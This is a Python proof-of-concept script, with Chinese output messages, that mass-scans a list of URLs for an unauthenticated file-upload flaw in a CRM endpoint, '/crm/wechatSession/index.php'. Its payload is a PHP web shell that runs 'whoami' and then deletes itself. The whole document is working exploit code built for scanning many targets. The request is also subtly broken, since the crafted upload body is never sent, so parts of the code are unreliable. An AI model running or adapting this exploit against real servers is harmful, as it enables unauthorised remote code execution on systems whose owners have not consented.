import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap
requests.packages.urllib3.disable_warnings()
import re
def check(url):
    try:
        url1 = f"{url}/crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy"
        }
        data = """------WebKitFormBoundary03rNBzFMIytvpWhy
        Content-Disposition: form-data; name="file"; filename="2.php"
        Content-Type: image/jpeg

        <?php system("whoami");unlink(__FILE__);?>
        ------WebKitFormBoundary03rNBzFMIytvpWhy--"""
        response = requests.post(url=url1,headers=headers,verify=False,timeout=5)
        response_text = response.text
        pattern = r'"filepath":"([^"]+)"'
        matches = re.findall(pattern, response_text)
        if response.status_code == 200 and 'code' in response.text:
            print(f'[*]{url}:漏洞存在{matches}')
        else:
            print('无法执行')
    except Exception as e:
        print('延时')


def main():
    parser = argparse.ArgumentParser(description="这 是 一 个 poc",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent('''python lade.py -u http://127.0.0.1:8000/'''))
    parser.add_argument('-u', '--url', help="python lade.py -u http://127.0.0.1:8000/", dest='url')
    parser.add_argument('-r', '--rl', help="python lade.py -r 1.txt", dest='rl')
    args = parser.parse_args()
    u = args.url
    r = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if u:
            check(u)
        elif r:
            with open(r, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        print(e)
    pool.map(check, lists)


if __name__ == '__main__':
    main()
    banner = '''
        .__           .__  .__                                      
    |  |__   ____ |  | |  |   ____    __ __  ______ ___________ 
    |  |  \_/ __ \|  | |  |  /  _ \  |  |  \/  ___// __ \_  __ \
    |   Y  \  ___/|  |_|  |_(  <_> ) |  |  /\___ \\  ___/|  | \/
    |___|  /\___  >____/____/\____/  |____//____  >\___  >__|   
         \/     \/                              \/     \/       
                '''
    print(banner)
